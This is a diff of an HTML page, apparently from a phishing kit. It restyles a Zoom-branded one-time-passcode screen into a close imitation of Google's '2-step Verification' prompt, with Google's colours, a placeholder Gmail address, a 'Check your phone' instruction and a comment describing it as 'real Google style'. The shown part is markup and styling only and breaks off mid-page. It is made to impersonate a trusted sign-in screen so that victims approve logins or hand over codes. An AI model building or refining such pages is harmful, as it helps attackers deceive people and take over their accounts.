@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no" />
-  <title>One Time Pass Code</title>
+  <title>2-step Verification</title>
 
   <link rel="icon" type="image/png" href="../../logo.png" />
   
@@ -23,7 +23,7 @@
       overflow: hidden;
     }
 
-    /* Professional layout with perfect balancing */
+    /* Asol Google style container with card border */
     .container {
       width: 100%;
       height: 100dvh;
@@ -33,119 +33,164 @@
       justify-content: space-between;
       align-items: center;
       text-align: center;
-      padding: 2vh 5vw 2.5vh 5vw;
+      padding: 3vh 6vw;
       background: #ffffff;
+      max-width: 480px;
+      margin: 0 auto;
+      border: 1px solid #dadce0;
+      border-radius: 8px;
     }
 
-    /* Top Header Group (Logo + Title) */
-    .header-group {
+    /* Top Section (Logo, Title, Subtitle, Email Pill) */
+    .top-section {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.8vh;
+      gap: 1vh;
     }
 
-    /* Top Logo */
+    /* Zoom Logo */
     .logo {
-      width: 14vw;
-      max-width: 60px;
+      width: 12vw;
+      max-width: 50px;
       height: auto;
       object-fit: contain;
       border-radius: 50%;
     }
 
-    /* Main Title - Boro font size */
+    /* Main Heading */
     h1 {
-      font-size: clamp(22px, 5.8vw, 28px);
-      font-weight: 700;
-      color: #1a1a1a;
+      font-size: clamp(22px, 5.5vw, 26px);
+      font-weight: 400;
+      color: #202124;
     }
 
-    /* Phone Graphic Illustration - Aro boro kora holo */
+    /* Subtitle */
+    .subtitle {
+      font-size: clamp(13.5px, 3.6vw, 15px);
+      color: #5f6368;
+      font-weight: 400;
+    }
+
+    /* Email Pill Selector box */
+    .email-pill {
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      gap: 8px;
+      padding: 6px 14px;
+      border: 1px solid #dadce0;
+      border-radius: 20px;
+      margin-top: 0.5vh;
+      background: #fff;
+    }
+
+    .email-pill svg {
+      width: 20px;
+      height: 20px;
+      fill: #1a73e8;
+    }
+
+    .email-text {
+      font-size: 13.5px;
+      font-weight: 500;
+      color: #3c4043;
+    }
+
+    .email-pill .arrow {
+      font-size: 11px;
+      color: #5f6368;
+    }
+
+    /* Phone Graphic Illustration (Middle) */
     .phone-illustration {
-      width: 72vw;
-      max-width: 310px;
+      width: 45vw;
+      max-width: 190px;
       height: auto;
-      max-height: 46vh;
+      max-height: 32vh;
       object-fit: contain;
       margin: auto 0;
     }
 
-    /* Bottom Content Group (Text + Button) */
-    .bottom-group {
+    /* Bottom Section (Instructions + Button) */
+    .bottom-section {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 1.5vh;
+      gap: 2vh;
     }
 
-    /* Text Wrapper */
+    /* Text Group */
     .text-group {
       display: flex;
       flex-direction: column;
       align-items: center;
       width: 100%;
-      gap: 0.5vh;
+      gap: 0.6vh;
     }
 
-    /* Sub Heading - Boro font size */
     h2 {
-      font-size: clamp(20px, 5vw, 25px);
-      font-weight: 700;
-      color: #1a1a1a;
+      font-size: clamp(17px, 4.5vw, 20px);
+      font-weight: 500;
+      color: #202124;
     }
 
-    /* Description Text - Boro font size */
     .desc-text {
-      font-size: clamp(15.5px, 4.2vw, 19px);
-      font-weight: 600;
-      color: #374151;
+      font-size: clamp(14px, 3.8vw, 16px);
+      font-weight: 400;
+      color: #3c4043;
       line-height: 1.4;
     }
 
     .desc-text span {
-      font-weight: 800;
-      color: #000000;
+      font-weight: 600;
+      color: #202124;
     }
 
-    /* Resend Button - Boro ebong attractive */
+    /* Resend / Action Button */
     .btn-join {
-      background-color: #007aff;
+      background-color: #1a73e8;
       color: white;
-      padding: 15px 0;
+      padding: 13px 0;
       width: 100%;
-      max-width: 370px;
-      font-size: 18px;
-      font-weight: bold;
+      max-width: 360px;
+      font-size: 15px;
+      font-weight: 500;
       border: none;
-      border-radius: 14px;
+      border-radius: 4px;
       cursor: pointer;
-      box-shadow: 0 4px 14px rgba(0, 122, 255, 0.3);
-      transition: background-color 0.2s, transform 0.1s;
+      transition: background-color 0.2s;
     }
 
     .btn-join:hover {
-      background-color: #005ec4;
+      background-color: #1557b0;
     }
 
     .btn-join:active {
-      transform: scale(0.98);
+      background-color: #174ea6;
     }
   </style>
 </head>
 <body>
 
   <div class="container">
-    <div class="header-group">
+    <div class="top-section">
       <img class="logo" src="../../Zoom-Logo.png" alt="Logo">
-      <h1>One Time Pass Code</h1>
+      <h1>2-step Verification</h1>
+      <p class="subtitle">This extra step shows that it’s really you trying to sign in</p>
+      
+      <div class="email-pill">
+        <svg viewBox="0 0 24 24"><path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm0 3c1.66 0 3 1.34 3 3s-1.34 3-3 3-3-1.34-3-3 1.34-3 3-3zm0 14.2c-2.5 0-4.71-1.28-6-3.22.03-1.99 4-3.08 6-3.08 1.99 0 5.97 1.09 6 3.08-1.29 1.94-3.5 3.22-6 3.22z"/></svg>
+        <span class="email-text">user@gmail.com</span>
+        <span class="arrow">▼</span>
+      </div>
     </div>
 
     <img class="phone-illustration" src="../icon.gif" alt="Phone Illustration">
 
-    <div class="bottom-group">
+    <div class="bottom-section">
       <div class="text-group">
         <h2>Check your phone.</h2>
         <p class="desc-text">
